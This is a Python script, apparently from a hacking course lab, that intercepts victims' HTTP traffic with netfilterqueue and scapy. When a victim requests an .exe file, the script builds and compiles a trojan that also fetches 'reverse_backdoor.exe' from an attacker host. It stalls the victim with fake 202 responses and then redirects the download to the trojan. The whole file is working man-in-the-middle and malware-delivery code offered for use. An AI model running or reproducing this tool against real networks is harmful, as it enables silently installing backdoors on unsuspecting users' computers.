#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re
import subprocess
import os
import time


ack_dict = {}
evil_file_url = "http://10.0.2.16/evil-files/reverse_backdoor.exe"
LHOST = "10.0.2.16"

def generate_trojan(front_file_url, trojan_url):
    with open("download_and_execute.py", "r") as trojan_template:
        trojan_code = trojan_template.read()

    trojan_code = re.sub("FILE1\s=\s.*", "FILE1 = '" + front_file_url + "'", trojan_code)
    trojan_code = re.sub("FILE2\s=\s.*", "FILE2 = '" + trojan_url + "'", trojan_code)

    trojan_name = front_file_url.split("/")[-1]
    with open(trojan_name, "w") as trojan_file:
        trojan_file.write(trojan_code)

    return trojan_name

def compile_trojan(trojan_name):
    print("[+] Compiling")
    subprocess.call("wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --distpath /var/www/html/ " + trojan_name, shell=True)

def get_url(load):
    path_search = re.search("(?:GET\s)(.*\.exe)", load)
    if path_search:
        path = path_search.group(1)
        host = re.search("(?:Host:\s)(.*)(?:\r\n)", load).group(1)
        return "http://" + host + path


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            url = get_url(scapy_packet[scapy.Raw].load)

            if url and ".exe" in url and LHOST not in url:
                if scapy_packet[scapy.TCP].ack in ack_dict:
                   packet.drop()
                   return

                print("[+] Interesting Request --> " + url)

                trojan_name = generate_trojan(url, evil_file_url)
                compile_trojan(trojan_name)

                ack_dict[scapy_packet[scapy.TCP].ack] = trojan_name

        elif scapy_packet[scapy.TCP].sport == 80:
            seq = scapy_packet[scapy.TCP].seq
            if seq in ack_dict:
                while not os.path.exists("/var/www/html/" + ack_dict[seq]):
                    delay_packet = set_load(scapy_packet, "HTTP/1.1 202 Accepted\n\n")
                    scapy.send(delay_packet)
                    time.sleep(2)

                print("[+] Serving Modified Download")

                trojan_rul = "http://" + LHOST + "/" + ack_dict[seq]
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + trojan_rul + "\n\n")
                print(modified_packet.show())
                packet.set_payload(str(modified_packet))
                ack_dict.pop(seq)

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()